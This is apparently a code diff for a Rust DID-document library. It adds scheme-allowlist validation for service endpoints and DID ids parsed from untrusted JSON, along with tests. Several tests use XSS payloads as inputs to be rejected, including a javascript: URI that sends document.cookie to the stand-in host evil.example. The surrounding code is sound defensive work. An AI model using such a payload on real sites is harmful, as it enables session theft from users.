@@ -44,44 +44,13 @@
 //! ));
 //! ```
 
+use crate::method::{validate_did_id, DidMethodConfig, ValidatedDidId};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
-use thiserror::Error;
 
-// ── Errors ───────────────────────────────────────────────────────────────────
-
-/// Errors that can occur in DID document and service endpoint operations.
-#[derive(Error, Debug, Clone, PartialEq, Eq)]
-pub enum DidError {
-    /// The URI could not be parsed.
-    ///
-    /// The `input` field is included so the caller gets an actionable message
-    /// without having to re-format the input themselves.
-    #[error("invalid URI `{input}`: {reason}")]
-    InvalidUri { input: String, reason: String },
-
-    /// The URI's scheme is not in the allowlist.
-    ///
-    /// `scheme` is the scheme that was rejected (e.g. `"javascript"`), and
-    /// `uri` is the full URI so the operator can find it in their document.
-    #[error(
-        "URI scheme `{scheme}` is not permitted for service endpoints \
-         (allowed: https, http, did); rejecting `{uri}`"
-    )]
-    InvalidScheme { scheme: String, uri: String },
-
-    /// A DID document already contains a service with this ID.
-    #[error("service `{0}` is already registered in this DID document")]
-    DuplicateServiceId(String),
-
-    /// The service ID is empty or blank.
-    #[error("service id must not be empty")]
-    EmptyServiceId,
-
-    /// The service type is empty or blank.
-    #[error("service type must not be empty")]
-    EmptyServiceType,
-}
+// Kept at its old path so existing `stellar_did::service::DidError` imports
+// continue to compile after the error type moved to `crate::error`.
+pub use crate::error::DidError;
 
 // ── Scheme allowlist ─────────────────────────────────────────────────────────
 
@@ -96,6 +65,25 @@ const ALLOWED_SCHEMES: &[&str] = &["https", "http", "did"];
 #[inline]
 fn is_scheme_allowed(scheme: &str) -> bool {
     ALLOWED_SCHEMES.contains(&scheme)
+}
+
+/// Validate a service endpoint URI against the scheme allowlist.
+///
+/// Used both before insertion and when a document is parsed from untrusted
+/// JSON, so deserialization cannot bypass the scheme check.
+fn validate_endpoint_uri(uri: &str) -> Result<(), DidError> {
+    let parsed = url::Url::parse(uri).map_err(|e| DidError::InvalidUri {
+        input: uri.to_string(),
+        reason: e.to_string(),
+    })?;
+    let scheme = parsed.scheme();
+    if !is_scheme_allowed(scheme) {
+        return Err(DidError::InvalidScheme {
+            scheme: scheme.to_string(),
+            uri: uri.to_string(),
+        });
+    }
+    Ok(())
 }
 
 // ── ServiceEndpoint ───────────────────────────────────────────────────────────
@@ -223,12 +211,73 @@ pub struct DidDocument {
 
 impl DidDocument {
     /// Create an empty DID document for the given subject `id`.
+    ///
+    /// This constructor is intentionally infallible for compatibility. It
+    /// does **not** validate the identifier. Use [`Self::try_new`] for input
+    /// that must satisfy DID Core and the configured method.
     #[must_use]
     pub fn new(id: impl Into<String>) -> Self {
         DidDocument {
             id: id.into(),
             service: Vec::new(),
         }
+    }
+
+    /// Create an empty DID document after validating `id` against `config`.
+    ///
+    /// The identifier is stored verbatim; validation never rewrites it.
+    ///
+    /// # Errors
+    ///
+    /// Returns the [`DidError`] from [`validate_did_id`] when `id` is malformed
+    /// or belongs to a different method. No document is created on failure.
+    pub fn try_new(id: impl Into<String>, config: &DidMethodConfig) -> Result<Self, DidError> {
+        let id = id.into();
+        validate_did_id(&id, config)?;
+        Ok(Self::new(id))
+    }
+
+    /// Validate this document's `id` against `config`.
+    ///
+    /// This is the resolution-side gate: a document loaded from storage or
+    /// received from another party can be checked before it is returned to a
+    /// caller, so a resolver never emits a document whose `id` names a
+    /// different method.
+    ///
+    /// # Errors
+    ///
+    /// Returns the [`DidError`] from [`validate_did_id`]. The document is not
+    /// modified on failure.
+    pub fn validate_id(&self, config: &DidMethodConfig) -> Result<ValidatedDidId, DidError> {
+        validate_did_id(&self.id, config)
+    }
+
+    /// Parse a serialized DID document and validate it before it is used.
+    ///
+    /// Intended for resolver and storage responses, where the JSON is
+    /// untrusted. Both the subject `id` (against `config`) and every service
+    /// endpoint URI (against the scheme allowlist) are checked. A rejected
+    /// document is discarded entirely — there is no partially validated
+    /// document to publish.
+    ///
+    /// # Errors
+    ///
+    /// * [`DidError::InvalidDocument`] — the input is not valid JSON for a
+    ///   [`DidDocument`].
+    /// * [`DidError::InvalidDid`] / [`DidError::MethodMismatch`] — the `id`
+    ///   fails DID Core validation or names another method.
+    /// * [`DidError::InvalidUri`] / [`DidError::InvalidScheme`] — a service
+    ///   endpoint is malformed or uses a disallowed scheme.
+    pub fn from_json_str(input: &str, config: &DidMethodConfig) -> Result<Self, DidError> {
+        let document: Self =
+            serde_json::from_str(input).map_err(|e| DidError::InvalidDocument {
+                reason: e.to_string(),
+            })?;
+        validate_did_id(&document.id, config)?;
+        for service in &document.service {
+            validate_endpoint_uri(service.service_endpoint.as_str())?;
+        }
+        Ok(document)
     }
 
     /// Add a service to the document, validating the endpoint scheme.
@@ -247,19 +296,7 @@ impl DidDocument {
         // Re-validate the scheme as defense-in-depth.  A ServiceEndpoint
         // constructed through the public API is already valid, but a document
         // deserialized from untrusted JSON could carry any string.
-        let parsed = url::Url::parse(service.service_endpoint.as_str()).map_err(|e| {
-            DidError::InvalidUri {
-                input: service.service_endpoint.as_str().to_string(),
-                reason: e.to_string(),
-            }
-        })?;
-        let scheme = parsed.scheme();
-        if !is_scheme_allowed(scheme) {
-            return Err(DidError::InvalidScheme {
-                scheme: scheme.to_string(),
-                uri: service.service_endpoint.as_str().to_string(),
-            });
-        }
+        validate_endpoint_uri(service.service_endpoint.as_str())?;
 
         // Reject duplicate IDs: a second entry with the same ID cannot shadow
         // the first without the caller explicitly removing the original.
@@ -315,7 +352,7 @@ mod tests {
     fn did_scheme_is_accepted() {
         // A DID URL is a valid service endpoint per DID Core.
         let ep = ServiceEndpoint::uri("did:stellar:testnet:GABC#linked-domain");
-        assert!(ep.is_ok(), "did: scheme must be accepted, got: {:?}", ep);
+        assert!(ep.is_ok(), "did: scheme must be accepted, got: {ep:?}");
     }
 
     #[test]
@@ -336,8 +373,7 @@ mod tests {
 
     #[test]
     fn data_scheme_is_rejected() {
-        let err =
-            ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
+        let err = ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
         assert!(
             matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "data"),
             "unexpected error: {err:?}"
@@ -451,13 +487,8 @@ mod tests {
         // by using the Deserialize path via JSON — but since ServiceEndpoint
         // stores a plain String, deserialization does not validate; that is the
         // defence-in-depth path we are testing here).
-        let bad_ep = ServiceEndpoint(
-            // Private field — craft via json round-trip
-            serde_json::from_value::<ServiceEndpoint>(serde_json::json!(
-                "javascript:alert(1)"
-            ))
-            .expect("deserialize"),
-        );
+        let bad_ep: ServiceEndpoint =
+            serde_json::from_value(serde_json::json!("javascript:alert(1)")).expect("deserialize");
         let svc = Service {
             id: "did:stellar:testnet:GABC#bad".to_string(),
             service_type: "Malicious".to_string(),
@@ -528,8 +559,89 @@ mod tests {
 
         let value: serde_json::Value = serde_json::to_value(&doc).unwrap();
         assert_eq!(value["id"].as_str(), Some("did:stellar:testnet:GABC"));
-        assert_eq!(value["service"][0]["service_endpoint"].as_str(), Some("https://hub.example.com"));
-        assert_eq!(value["service"][0]["service_type"].as_str(), Some("LinkedDomains"));
+        assert_eq!(
+            value["service"][0]["service_endpoint"].as_str(),
+            Some("https://hub.example.com")
+        );
+        assert_eq!(
+            value["service"][0]["service_type"].as_str(),
+            Some("LinkedDomains")
+        );
+    }
+
+    // ── DID document id validation (issue #338) ───────────────────────────────
+
+    #[test]
+    fn try_new_accepts_valid_id_and_stores_it_verbatim() {
+        let config = DidMethodConfig::default();
+        let doc = DidDocument::try_new("did:stellar:testnet:GABC", &config).unwrap();
+        assert_eq!(doc.id, "did:stellar:testnet:GABC");
+        assert!(doc.service.is_empty());
+    }
+
+    #[test]
+    fn try_new_rejects_foreign_method() {
+        let err =
+            DidDocument::try_new("did:example:alice", &DidMethodConfig::default()).unwrap_err();
+        assert!(matches!(err, DidError::MethodMismatch { .. }), "{err:?}");
+    }
+
+    #[test]
+    fn new_still_accepts_unvalidated_ids_for_compatibility() {
+        let doc = DidDocument::new("not even a did");
+        assert_eq!(doc.id, "not even a did");
+    }
+
+    #[test]
+    fn validate_id_checks_an_existing_document_without_mutating_it() {
+        let doc = DidDocument::new("did:example:alice");
+        let err = doc.validate_id(&DidMethodConfig::default()).unwrap_err();
+        assert!(matches!(err, DidError::MethodMismatch { .. }), "{err:?}");
+        assert_eq!(doc.id, "did:example:alice");
+    }
+
+    #[test]
+    fn from_json_str_accepts_a_valid_document() {
+        let config = DidMethodConfig::default();
+        let mut original = DidDocument::try_new("did:stellar:testnet:GABC", &config).unwrap();
+        original
+            .add_service(make_service(
+                "did:stellar:testnet:GABC#hub",
+                "https://hub.example.com",
+            ))
+            .unwrap();
+
+        let json = serde_json::to_string(&original).unwrap();
+        let parsed = DidDocument::from_json_str(&json, &config).unwrap();
+        assert_eq!(parsed.id, original.id);
+        assert_eq!(parsed.service.len(), 1);
+    }
+
+    #[test]
+    fn from_json_str_rejects_foreign_method() {
+        let json = r#"{"id":"did:example:alice","service":[]}"#;
+        let err = DidDocument::from_json_str(json, &DidMethodConfig::default()).unwrap_err();
+        assert!(matches!(err, DidError::MethodMismatch { .. }), "{err:?}");
+    }
+
+    #[test]
+    fn from_json_str_rejects_bad_endpoint_in_a_stored_document() {
+        let json = r#"{
+            "id": "did:stellar:testnet:GABC",
+            "service": [{
+                "id": "did:stellar:testnet:GABC#bad",
+                "service_type": "Bad",
+                "service_endpoint": "javascript:alert(1)"
+            }]
+        }"#;
+        let err = DidDocument::from_json_str(json, &DidMethodConfig::default()).unwrap_err();
+        assert!(matches!(err, DidError::InvalidScheme { .. }), "{err:?}");
+    }
+
+    #[test]
+    fn from_json_str_rejects_malformed_json() {
+        let err = DidDocument::from_json_str("{not json", &DidMethodConfig::default()).unwrap_err();
+        assert!(matches!(err, DidError::InvalidDocument { .. }), "{err:?}");
     }
 
     // ── Integration: full document publication workflow ───────────────────────
@@ -563,10 +675,13 @@ mod tests {
     fn full_publication_workflow_rejects_dangerous_endpoint_before_publication() {
         // A document that attempts to add a dangerous endpoint must fail
         // before the service is committed to the document.
-        let mut document = DidDocument::new("did:stellar:testnet:GABC");
+        let document = DidDocument::new("did:stellar:testnet:GABC");
 
         // This endpoint would be dangerous in a browser-rendered resolver UI.
-        let err = ServiceEndpoint::uri("javascript:void(document.location='http://evil.example/steal?c='+document.cookie)").unwrap_err();
+        let err = ServiceEndpoint::uri(
+            "javascript:void(document.location='http://evil.example/steal?c='+document.cookie)",
+        )
+        .unwrap_err();
         assert!(matches!(err, DidError::InvalidScheme { .. }));
 
         // The document was never modified.
